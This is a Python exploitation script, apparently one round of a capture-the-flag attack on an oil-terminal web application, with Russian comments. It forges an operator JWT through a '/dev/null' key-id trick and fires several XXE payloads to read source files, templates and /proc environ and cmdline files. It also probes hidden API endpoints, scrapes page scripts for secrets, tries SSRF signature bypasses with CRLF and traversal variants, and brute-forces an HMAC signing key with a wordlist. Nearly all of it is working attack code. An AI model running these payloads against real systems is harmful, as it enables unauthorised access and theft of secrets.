#!/usr/bin/env python3
"""round46 — Полная diagnostics страница, error-based XXE, environ через /proc/N"""
import requests, time, json, hmac as hm, hashlib, base64, re

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# ============================================================
print("="*70)
print("PHASE 1: ПОЛНАЯ DIAGNOSTICS СТРАНИЦА")
print("="*70)

try:
    r = S.get(f"{CASPI}/ops/diagnostics", headers=AUTH_OP, timeout=10)
    print(f"  [{r.status_code}] ({len(r.text)} bytes)")
    print(r.text)
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: DIAGNOSTICS API — ВСЕ ВОЗМОЖНЫЕ ENDPOINTS")
print("="*70)

# Проверяем все статус коды (не скрываем 404/405)
diag_endpoints = [
    "/api/ops/diagnostics",
    "/api/diagnostics",
    "/api/ops/diagnostics/config",
    "/api/ops/diagnostics/probe",
    "/api/ops/diagnostics/devices",
    "/api/ops/diagnostics/ping",
    "/api/ops/diagnostics/check",
    "/api/ops/diagnostics/run",
    "/api/ops/probe/diagnostics",
    "/api/ops/devices",
    "/api/ops/config",
    "/api/config",
    "/api/health",
    "/api/status",
    "/api/info",
    "/api/env",
    "/api/debug",
    "/api/ops/probe/list",
    "/api/ops/probe/devices",
    "/api/ops/probe/status",
]

for ep in diag_endpoints:
    try:
        r = S.get(f"{CASPI}{ep}", headers=AUTH_OP, timeout=5)
        print(f"  GET [{r.status_code}] {ep}: {r.text[:150]}")
    except Exception as e:
        print(f"  GET [ERR] {ep}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: ERROR-BASED XXE — ПОПЫТКА УТЕЧКИ ЧЕРЕЗ ОШИБКИ")
print("="*70)

# Техника 1: Параметрическая сущность с подстановкой в несуществующий URI
# Если lxml возвращает ошибку с именем файла...
error_xxe_tests = [
    # Классическая error-based XXE
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///app/app.py">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<ticket><reference>r</reference><tankId>T-01</tankId><product>D</product>
<grossVolume>1</grossVolume><netVolume>1</netVolume>
<density>1</density><temperature>1</temperature>
<carrier>C</carrier><remarks>R</remarks></ticket>''', "error-based classic"),

    # Попытка через SYSTEM с подстановкой
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///app/app.py">
  %file;
]>
<ticket><reference>r</reference><tankId>T-01</tankId><product>D</product>
<grossVolume>1</grossVolume><netVolume>1</netVolume>
<density>1</density><temperature>1</temperature>
<carrier>C</carrier><remarks>R</remarks></ticket>''', "parameter entity direct"),

    # UTF-16 encoded entity — может обойти < и &
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY x SYSTEM "file:///app/app.py">
]>
<ticket><reference>r</reference><tankId>T-01</tankId><product>D</product>
<grossVolume>1</grossVolume><netVolume>1</netVolume>
<density>1</density><temperature>1</temperature>
<carrier>C</carrier><remarks>&x;</remarks></ticket>''', "standard (baseline 400)"),

    # Попытка CDATA trick с parameter entities
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///app/app.py">
  <!ENTITY % end "]]>">
  <!ENTITY % combined "<!ENTITY wrapper '%start;%file;%end;'>">
  %combined;
]>
<ticket><reference>r</reference><tankId>T-01</tankId><product>D</product>
<grossVolume>1</grossVolume><netVolume>1</netVolume>
<density>1</density><temperature>1</temperature>
<carrier>C</carrier><remarks>&wrapper;</remarks></ticket>''', "CDATA wrapper trick"),

    # Попробуем обернуть в CDATA напрямую
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY x SYSTEM "file:///app/entrypoint.sh">
]>
<ticket><reference>r</reference><tankId>T-01</tankId><product>D</product>
<grossVolume>1</grossVolume><netVolume>1</netVolume>
<density>1</density><temperature>1</temperature>
<carrier>C</carrier><remarks><![CDATA[&x;]]></remarks></ticket>''', "CDATA around entity ref"),
]

for xml, label in error_xxe_tests:
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml.encode(), headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
        print(f"\n  [{r.status_code}] {label}:")
        # Показываем полный ответ — может содержать утечку
        print(f"  {r.text[:500]}")
    except Exception as e:
        print(f"\n  [ERR] {label}: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: ENVIRON ЧЕРЕЗ ДРУГИЕ PID")
print("="*70)

# /proc/self/environ содержит null bytes
# Но /proc/1/environ — может быть другой формат?
# Также пробуем /proc/self/task/*/environ
for proc_path in [
    "/proc/1/environ",
    "/proc/1/cmdline",
    "/proc/self/cmdline",
    "/proc/1/status",
    "/proc/self/status",
    "/proc/1/cgroup",
    "/proc/self/cgroup",
    # Gunicorn workers — PID 1 это master, workers это другие PIDs
    "/proc/2/environ", "/proc/2/cmdline",
    "/proc/3/environ", "/proc/3/cmdline",
    "/proc/4/environ", "/proc/4/cmdline",
    "/proc/5/environ", "/proc/5/cmdline",
    "/proc/6/environ", "/proc/6/cmdline",
    "/proc/7/environ", "/proc/7/cmdline",
    "/proc/8/environ", "/proc/8/cmdline",
    "/proc/9/environ", "/proc/9/cmdline",
    "/proc/10/environ", "/proc/10/cmdline",
]:
    st, val = xxe_read(proc_path)
    if st == "OK" and val:
        print(f"\n  [OK] {proc_path} ({len(val)} chars):")
        # Для environ — покажем все
        print(f"    {val[:500]}")
    elif st == "BIN":
        print(f"  [BIN] {proc_path}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: DIAGNOSTICS JS — ИЩЕМ API ВЫЗОВЫ В HTML")
print("="*70)

try:
    r = S.get(f"{CASPI}/ops/diagnostics", headers=AUTH_OP, timeout=10)
    if r.status_code == 200:
        # Извлекаем все URL, fetch, axios, xhr вызовы
        urls = re.findall(r'(?:fetch|axios|XMLHttpRequest|\.get|\.post|href|src|action)\s*\(\s*[\'"]([^\'"]+)[\'"]', r.text)
        if urls:
            print("  URL в JavaScript:")
            for u in urls:
                print(f"    {u}")

        # Ищем все /api/ пути
        api_paths = re.findall(r'[\'"/](api/[^\'"<>\s]+)[\'"]', r.text)
        if api_paths:
            print("\n  API пути:")
            for p in set(api_paths):
                print(f"    /{p}")

        # Ищем все fetch/POST/GET
        fetches = re.findall(r'fetch\([^)]+\)', r.text)
        if fetches:
            print("\n  fetch() вызовы:")
            for f in fetches:
                print(f"    {f[:200]}")

        # Ищем переменные с secret/key/config
        secrets = re.findall(r'(?:secret|key|config|token|probe|hmac|sign)\s*[:=]\s*[\'"][^\'"]*[\'"]', r.text, re.IGNORECASE)
        if secrets:
            print("\n  СЕКРЕТЫ в JS:")
            for s in secrets:
                print(f"    {s}")

        # Полный JavaScript блок
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', r.text, re.DOTALL)
        if scripts:
            print(f"\n  Найдено {len(scripts)} script блоков:")
            for i, s in enumerate(scripts):
                print(f"\n  --- Script {i+1} ({len(s)} chars) ---")
                print(f"  {s[:2000]}")
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: ШАБЛОН DIAGNOSTICS")
print("="*70)

# Раз /ops/diagnostics рендерится, есть шаблон
# Читаем через XXE (Jinja templates обычно не содержат < в raw виде)
for tp in [
    "/app/templates/ops/diagnostics.html",
    "/app/templates/diagnostics.html",
    "/app/templates/ops/diag.html",
    "/app/templates/ops/devices.html",
]:
    st, val = xxe_read(tp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {tp} ({len(val)} символов):")
        print(val[:3000])
    elif st == "BIN":
        print(f"  [СУЩЕСТВУЕТ/БИНАРНЫЙ] {tp}")

# Также probe template
for tp in [
    "/app/templates/ops/probe.html",
    "/app/templates/ops/probe_test.html",
]:
    st, val = xxe_read(tp)
    if st == "OK" and val:
        print(f"\n  [НАЙДЕН!] {tp} ({len(val)} символов):")
        print(val[:3000])
    elif st == "BIN":
        print(f"  [СУЩЕСТВУЕТ/БИНАРНЫЙ] {tp}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: PROBE SIGN С РАЗНЫМИ DEVICE — КРОСС-АНАЛИЗ")
print("="*70)

# Получаем свежие подписи для всех 5 устройств
devices_data = {}
for dev in ["lm-01", "tk-01", "tk-02", "tk-03", "tk-07"]:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign",
            params={"device": dev}, headers=AUTH_OP, timeout=5)
        if r.status_code == 200:
            d = r.json()
            devices_data[dev] = d
            print(f"  {dev}: url={d.get('url','')}")
            print(f"         sig={d.get('sig','')}")
    except Exception as e:
        print(f"  {dev}: Error {e}")

# Интересный тест: что если sig = HMAC(secret, device)?
# Или sig = HMAC(secret, device + "\n")?
# Или sig = HMAC(secret, device + url)?
# Проверяем: если две подписи для одного URL но разных device отличаются,
# значит device участвует в подписи
print("\n  Все URL одинаковые? (Тест: device влияет на подпись или нет)")
urls_set = set()
for dev, data in devices_data.items():
    urls_set.add(data.get('url',''))
print(f"  Уникальных URL: {len(urls_set)}")
if len(urls_set) == len(devices_data):
    print("  Каждый device имеет свой URL → подпись зависит от URL")
else:
    print("  Некоторые device имеют одинаковый URL → можно проверить")
    # Найти устройства с одинаковым URL
    from collections import defaultdict
    url_devs = defaultdict(list)
    for dev, data in devices_data.items():
        url_devs[data.get('url','')].append((dev, data.get('sig','')))
    for url, devs in url_devs.items():
        if len(devs) > 1:
            sigs = [s for _, s in devs]
            if len(set(sigs)) == 1:
                print(f"  ОДИНАКОВАЯ подпись для разных device → device НЕ участвует")
            else:
                print(f"  РАЗНАЯ подпись для одного URL → device УЧАСТВУЕТ в подписи!")
                for d, s in devs:
                    print(f"    {d}: {s}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: PROBE — ПОПЫТКИ SSRF ЧЕРЕЗ ИЗВЕСТНЫЕ ПОДПИСИ")
print("="*70)

# Мы знаем подписанные URL. Попробуем модифицировать URL минимально
# и посмотреть, проверяет ли сервер точное совпадение или prefix
known = devices_data.get("lm-01", {})
if known:
    url = known.get("url", "")
    sig = known.get("sig", "")

    url_variants = [
        url,  # оригинал — должен пройти
        url + "/",  # trailing slash
        url + "?",  # trailing ?
        url + "#",  # fragment
        url + "/../flow",  # path traversal
        url.replace("flow", "flow/../../flow"),  # path normalize
        url + "\n" + "http://127.0.0.1:3000/",  # CRLF injection
        url + "%0a" + "http://127.0.0.1:3000/",  # URL-encoded newline
        url + " ",  # trailing space
        url.upper(),  # uppercase
    ]

    for v in url_variants:
        try:
            r = S.post(f"{CASPI}/api/ops/probe",
                json={"url": v, "sig": sig}, headers=AUTH_OP, timeout=5)
            if r.status_code == 200:
                d = r.json()
                body = d.get("body", "")[:200]
                print(f"  [200] '{v[:80]}': {body[:100]}")
            else:
                print(f"  [{r.status_code}] '{v[:80]}'")
        except Exception as e:
            print(f"  [ERR] '{v[:60]}': {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: РАСШИРЕННЫЙ WORDLIST — HMAC")
print("="*70)

known_url_b = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig_hex = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

# Длинный wordlist — CTF-специфичные, OT/SCADA, нефть/газ
extended_words = [
    # OT/SCADA
    "modbus", "opcua", "dnp3", "bacnet", "profinet",
    "fieldbus", "ethernet/ip", "hart", "foundation",
    # Нефтяные термины (каз/рус/англ)
    "мунай", "мұнай", "нефть", "газ", "aktau", "atyrau",
    "kazmunaygas", "kmg", "tengiz", "kashagan", "karachaganak",
    # Caspi-specific
    "caspiterminal", "caspi_terminal", "caspi-terminal",
    "CaspiTerminal", "CASPITERMINAL",
    "caspian", "caspian_sea", "каспий",
    # LLEHS = SHELL backwards
    "shell", "llehs", "SHELL", "LLEHS", "Shell", "Llehs",
    "royal_dutch_shell", "shellprobe", "probeshell",
    "shell_probe", "probe_shell",
    # Docker compose
    "khs-oil-depot", "khs_oil_depot", "khsoildepot",
    "oil-depot", "oil_depot", "oildepot",
    # Gauge-GW
    "gauge-gw", "gauge_gw", "gaugegw", "gauge-gateway",
    # Common secrets
    "s3cr3t", "sup3rs3cr3t", "p@ssw0rd", "passw0rd",
    "admin123", "test123", "probe123", "secret123",
    # Based on found flags
    "KHS", "STF", "khs", "stf",
    # Terminal specific
    "terminal_probe", "probe_terminal", "terminal_secret",
    "terminal_key", "web_probe", "probe_web",
    # Database password variations
    "terminal_web_pw", "terminal_web", "terminal",
    # Envvar names as values
    "PROBE_SECRET", "probe_secret", "ProbeSecret",
    "FLASK_SECRET", "flask_secret", "FlaskSecret",
    "SECRET_KEY", "secret_key", "SecretKey",
    "APP_SECRET", "app_secret", "AppSecret",
    # Hex/hash fragments from flags
    "c360e9431f", "c8142af027", "08dd924c",
    # Port + service
    "9100", "8007", "5432", "3000",
    # Container info
    "5407f6317f5c",
    # Simple patterns
    "abcdef", "123456", "qwerty", "monkey",
    "iloveyou", "dragon", "master", "hunter",
    "probe", "secret", "key", "sign", "hmac",
    # With underscores and hyphens
    "probe-secret", "probe_key", "probe-key",
    "signing-key", "signing_key", "hmac-key", "hmac_key",
    "api-key", "api_key", "auth-key", "auth_key",
]

found = False
for word in extended_words:
    key = word.encode() if isinstance(word, str) else word
    h = hm.new(key, known_url_b, hashlib.sha256).hexdigest()
    if h == known_sig_hex:
        print(f"\n  НАЙДЕН PROBE_SECRET: '{word}' <<<<<<")
        found = True
        break
    # С переводом строки
    h2 = hm.new(key + b"\n", known_url_b, hashlib.sha256).hexdigest()
    if h2 == known_sig_hex:
        print(f"\n  НАЙДЕН PROBE_SECRET: '{word}\\n' <<<<<<")
        found = True
        break

if not found:
    print("  Расширенный wordlist: ни одно слово не совпало")

print("\n"+"="*70)
print("DONE")
print("="*70)
